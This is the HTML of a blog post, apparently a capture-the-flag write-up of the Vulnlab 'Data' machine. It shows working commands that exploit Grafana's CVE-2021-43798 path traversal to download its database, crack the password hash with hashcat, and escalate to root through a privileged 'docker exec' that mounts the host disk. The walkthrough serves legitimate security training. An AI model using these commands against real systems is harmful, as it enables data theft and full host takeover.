@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Vulnlab: Data - Journal</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Data is an easy linux machine from vulnlabs where we exploit a vulnerable version of grafana to pull out its database file. We get some hashes that can be cracked to get ssh credentials. Root part involves exploiting privileged containers." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Vulnlab: Data" />
+<meta property="og:description" content="Data is an easy linux machine from vulnlabs where we exploit a vulnerable version of grafana to pull out its database file. We get some hashes that can be cracked to get ssh credentials. Root part involves exploiting privileged containers." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://danp.bz/posts/vulnlab-data/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-07T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnlab: Data"/>
+<meta name="twitter:description" content="Data is an easy linux machine from vulnlabs where we exploit a vulnerable version of grafana to pull out its database file. We get some hashes that can be cracked to get ssh credentials. Root part involves exploiting privileged containers."/>
+<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://danp.bz/css/main.5a1df495afe53092e2ad0c172adb2250810f442ca165c5f85673cb3b860f3468.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://danp.bz/css/dark.134db564d2aacf16987413a93acdb0fdfe7ada0bd1972f2871066b32c9277a7b.css"  disabled />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://danp.bz/">Journal</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/whoami">Whoami</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://danp.bz/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Vulnlab: Data</h1>
+			<div class="meta">Posted on Sep 7, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<ul>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#identifying-vulnerable-grafana">Identifying Vulnerable Grafana</a></li>
+<li><a href="#cracking-custom-hashes">Cracking Custom Hashes</a></li>
+<li><a href="#abusing-docker-to-elevate-privileges">Abusing Docker to Elevate Privileges</a></li>
+</ul>
+<h1 id="overview">Overview</h1>
+<ol>
+<li>Identify the vulnerable version of grafana</li>
+<li>Abuse the arbitrary file read to retrieve the database file</li>
+<li>Get password hash and salt to crack with hashcat to get user.txt</li>
+<li><code>sudo -l</code> command shows that <code>docker exec *</code> can be run by boris</li>
+<li>Use it to run privileged commands on the running container</li>
+<li>Mount the host disk inside the container to get root flag</li>
+</ol>
+<h1 id="nmap">Nmap</h1>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-data » nmap -sV 10.10.125.165
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 14:50 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#fb660a;font-weight:bold">for</span> 10.10.125.165
+</span></span><span style="display:flex;"><span>Host is up (0.17s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#0086f7;font-weight:bold">998</span> closed tcp ports (conn-refused)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp?
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port3000-TCP:V=7.94%I=7%D=9/7%Time=64FA1BA1%P=x86_64-pc-linux-gnu%r(Gen
+</span></span><span style="display:flex;"><span>&lt;==================== <span style="color:#fb660a">snip</span> =====================&gt;
+</span></span><span style="display:flex;"><span>SF:r<span style="color:#0086d2">\n</span>Content-Length:<span style="color:#0086d2">\x</span>2029<span style="color:#0086d2">\r\n\r\n</span>&lt;a<span style="color:#0086d2">\x</span>20href=<span style="color:#0086d2">\&#34;</span>/login<span style="color:#0086d2">\&#34;</span>&gt;Found&lt;/a&gt;<span style="color:#0086d2">\.\n\n</span><span style="color:#0086d2">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Nmap done: 1 IP address (1 host up) scanned in 112.26 seconds
+</span></span></span></code></pre></div><ul>
+<li><code>-sV</code>: Enumerate versions</li>
+</ul>
+<h1 id="identifying-vulnerable-grafana">Identifying Vulnerable Grafana</h1>
+<p>Accessing port 3000 we see a grafana login page. The version is displayed on the bottom, <code>8.0.0</code></p>
+<p><img src="/data-img/image.png" alt="Alt text"></p>
+<p>Searching for exploits for this particular version, we find <a href="https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/">CVE-2021-43798</a>, which let&rsquo;s us read arbitrary files on the server. According to the article, we can exploit this by going to an installed plugin endpoint and traverse from there:</p>
+<p><img src="/data-img/imag2.png" alt="Alt text"></p>
+<p><a href="https://github.com/jas502n/Grafana-CVE-2021-43798">This</a> github repository goes deeper on the explanation and includes some payloads we can use to further enumerate the machine.</p>
+<p>Let&rsquo;s fetch the database files which contains some passwords hashes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-data » curl --path-as-is -s http://10.10.125.165:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -O grafana.db                   <span style="color:#0086f7;font-weight:bold">130</span> ↵
+</span></span><span style="display:flex;"><span>--- vulnlabs/easy-data » ls -la grafana.db                                                                                                                                            <span style="color:#0086f7;font-weight:bold">6</span> ↵
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#0086f7;font-weight:bold">1</span> kali kali <span style="color:#0086f7;font-weight:bold">598016</span> Sep  <span style="color:#0086f7;font-weight:bold">7</span> 15:40 grafana.db
+</span></span></code></pre></div><p>Opening it with <code>sqlitebrowser</code> and looking at the <code>user</code> table:</p>
+<p><img src="/data-img/image3.png" alt="Alt text"></p>
+<h1 id="cracking-custom-hashes">Cracking Custom Hashes</h1>
+<p>We get the password hash and its salt. Let&rsquo;s format it with a quick python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>password = <span style="color:#0086d2">&#39;dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&#39;</span>
+</span></span><span style="display:flex;"><span>salt = <span style="color:#0086d2">b</span><span style="color:#0086d2">&#39;LCBhdtJWjl&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hash64 = base64.b64encode(bytes.fromhex(password)).decode(<span style="color:#0086d2">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>salt64 = base64.b64encode(salt).decode(<span style="color:#0086d2">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result = <span style="color:#0086d2">f</span><span style="color:#0086d2">&#34;sha256:10000:</span><span style="color:#0086d2">{</span>salt64<span style="color:#0086d2">}</span><span style="color:#0086d2">:</span><span style="color:#0086d2">{</span>hash64<span style="color:#0086d2">}</span><span style="color:#0086d2">&#34;</span>
+</span></span><span style="display:flex;"><span>print(result)
+</span></span></code></pre></div><p>More about this formatting can be found <a href="https://vulncheck.com/blog/grafana-cve-2021-43798">here</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-data » hashcat -m <span style="color:#0086f7;font-weight:bold">10900</span> hash.txt /usr/share/wordlists/rockyou.txt --show
+</span></span><span style="display:flex;"><span>sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
+</span></span></code></pre></div><p><em>(If you are running for the first time remove the <code>--show</code> flag)</em></p>
+<p>We get the credential:</p>
+<p><code>boris:beautiful1</code></p>
+<p>let&rsquo;s ssh in and get our user.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-data » ssh boris@10.10.125.165
+</span></span><span style="display:flex;"><span>boris@10.10.125.165&#39;s password: <span style="color:#080;background-color:#0f140f;font-style:italic">#beautiful1</span>
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)
+</span></span><span style="display:flex;"><span> &lt;snip&gt;
+</span></span><span style="display:flex;"><span>boris@ip-10-10-10-11:~$ cat user.txt 
+</span></span><span style="display:flex;"><span>VL{fbc4&lt;snip&gt;654}
+</span></span></code></pre></div><h1 id="abusing-docker-to-elevate-privileges">Abusing Docker to Elevate Privileges</h1>
+<p>Initial enumeration shows that the grafana app was running from a docker container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>root       <span style="color:#0086f7;font-weight:bold">930</span>     <span style="color:#0086f7;font-weight:bold">1</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+</span></span><span style="display:flex;"><span>root      <span style="color:#0086f7;font-weight:bold">1301</span>   <span style="color:#0086f7;font-weight:bold">890</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:02 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
+</span></span><span style="display:flex;"><span>root      <span style="color:#0086f7;font-weight:bold">1384</span>     <span style="color:#0086f7;font-weight:bold">2</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:00 bpfilter_umh
+</span></span><span style="display:flex;"><span>root      <span style="color:#0086f7;font-weight:bold">1580</span>   <span style="color:#0086f7;font-weight:bold">890</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port <span style="color:#0086f7;font-weight:bold">3000</span> -container-ip 172.17.0.2 -container-port <span style="color:#0086f7;font-weight:bold">3000</span>
+</span></span><span style="display:flex;"><span>root      <span style="color:#0086f7;font-weight:bold">1585</span>   <span style="color:#0086f7;font-weight:bold">890</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port <span style="color:#0086f7;font-weight:bold">3000</span> -container-ip 172.17.0.2 -container-port <span style="color:#0086f7;font-weight:bold">3000</span>
+</span></span><span style="display:flex;"><span>root      <span style="color:#0086f7;font-weight:bold">1603</span>     <span style="color:#0086f7;font-weight:bold">1</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -addres
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">472</span>       <span style="color:#0086f7;font-weight:bold">1631</span>  <span style="color:#0086f7;font-weight:bold">1603</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:02 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default
+</span></span><span style="display:flex;"><span>root      <span style="color:#0086f7;font-weight:bold">1643</span>     <span style="color:#0086f7;font-weight:bold">1</span>  <span style="color:#0086f7;font-weight:bold">0</span> 18:44 ?        00:00:00 /usr/sbin/sshd -D
+</span></span></code></pre></div><p><code>sudo -l</code> gives us something important too:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>boris@ip-10-10-10-11:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#fb660a;font-weight:bold">for</span> boris on ip-10-10-10-11:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#fb660a">secure_path</span>=/usr/local/sbin<span style="color:#0086d2">\:</span>/usr/local/bin<span style="color:#0086d2">\:</span>/usr/sbin<span style="color:#0086d2">\:</span>/usr/bin<span style="color:#0086d2">\:</span>/sbin<span style="color:#0086d2">\:</span>/bin<span style="color:#0086d2">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User boris may run the following commands on ip-10-10-10-11:
+</span></span><span style="display:flex;"><span>    (root) NOPASSWD: /snap/bin/docker exec *
+</span></span></code></pre></div><p>We are able to run <code>/snap/bin/docker exec *</code> as sudo, let&rsquo;s see what this <code>exec</code> command can do:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>boris@ip-10-10-10-11:~$ docker exec -h
+</span></span><span style="display:flex;"><span>Flag shorthand -h has been deprecated, please use --help
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Run a command in a running container
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Options:
+</span></span><span style="display:flex;"><span>  -d, --detach               Detached mode: run command in the background
+</span></span><span style="display:flex;"><span>      --detach-keys string   Override the key sequence <span style="color:#fb660a;font-weight:bold">for</span> detaching a container
+</span></span><span style="display:flex;"><span>  -e, --env list             Set environment variables
+</span></span><span style="display:flex;"><span>      --env-file list        Read in a file of environment variables
+</span></span><span style="display:flex;"><span>  -i, --interactive          Keep STDIN open even <span style="color:#fb660a;font-weight:bold">if</span> not attached
+</span></span><span style="display:flex;"><span>      --privileged           Give extended privileges to the command
+</span></span><span style="display:flex;"><span>  -t, --tty                  Allocate a pseudo-TTY
+</span></span><span style="display:flex;"><span>  -u, --user string          Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])
+</span></span><span style="display:flex;"><span>  -w, --workdir string       Working directory inside the container
+</span></span></code></pre></div><ul>
+<li><code>-u</code>: allows us to run a root shell inside the container</li>
+<li><code>--privileged</code>: allows us to run commands with extended privileges (which we will abuse)</li>
+</ul>
+<p>With those extended privileges we can mount the host disk inside our container, giving access to the <code>root.txt</code> file</p>
+<p>let&rsquo;s run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>boris@ip-10-10-10-11:~$ sudo /snap/bin/docker exec --privileged -u <span style="color:#0086f7;font-weight:bold">0</span> -it grafana sh
+</span></span><span style="display:flex;"><span>/usr/share/grafana <span style="color:#080;background-color:#0f140f;font-style:italic"># mkdir -p /mnt/danp (Create a folder where the partition will be mounted)</span>
+</span></span><span style="display:flex;"><span>/usr/share/grafana <span style="color:#080;background-color:#0f140f;font-style:italic"># fdisk -l (List all partitions)</span>
+</span></span><span style="display:flex;"><span>Disk /dev/xvda: <span style="color:#0086f7;font-weight:bold">8192</span> MB, <span style="color:#0086f7;font-weight:bold">8589934592</span> bytes, <span style="color:#0086f7;font-weight:bold">16777216</span> sectors
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">6367</span> cylinders, <span style="color:#0086f7;font-weight:bold">85</span> heads, <span style="color:#0086f7;font-weight:bold">31</span> sectors/track
+</span></span><span style="display:flex;"><span>Units: sectors of <span style="color:#0086f7;font-weight:bold">1</span> * <span style="color:#fb660a">512</span> = <span style="color:#0086f7;font-weight:bold">512</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Device   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
+</span></span><span style="display:flex;"><span>/dev/xvda1 *  0,32,33     20,84,31          <span style="color:#0086f7;font-weight:bold">2048</span>   <span style="color:#0086f7;font-weight:bold">16777182</span>   <span style="color:#0086f7;font-weight:bold">16775135</span> 8190M <span style="color:#0086f7;font-weight:bold">83</span> Linux
+</span></span><span style="display:flex;"><span>/usr/share/grafana <span style="color:#080;background-color:#0f140f;font-style:italic"># mount /dev/xvda1 /mnt/danp (Mount the /dev/xvda1 inside the container)</span>
+</span></span><span style="display:flex;"><span>/usr/share/grafana <span style="color:#080;background-color:#0f140f;font-style:italic"># cd /mnt/danp/root</span>
+</span></span><span style="display:flex;"><span>/mnt/danp/root <span style="color:#080;background-color:#0f140f;font-style:italic"># cat root.txt</span>
+</span></span><span style="display:flex;"><span>VL{37c9&lt;snip&gt;bc16}
+</span></span></code></pre></div><p>That&rsquo;s all folks 🥕 ~</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/vulnlab">vulnlab</a></li>
+					
+					<li><a href="/tags/easy">easy</a></li>
+					
+					<li><a href="/tags/grafana">grafana</a></li>
+					
+					<li><a href="/tags/docker">docker</a></li>
+					
+					<li><a href="/tags/hash-cracking">hash-cracking</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/D4n-P" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/dan_ps__" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/danielspatricio/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    Feel free to reach me at any of my social media 🎃
+  </div>
+</footer>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-164145585-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
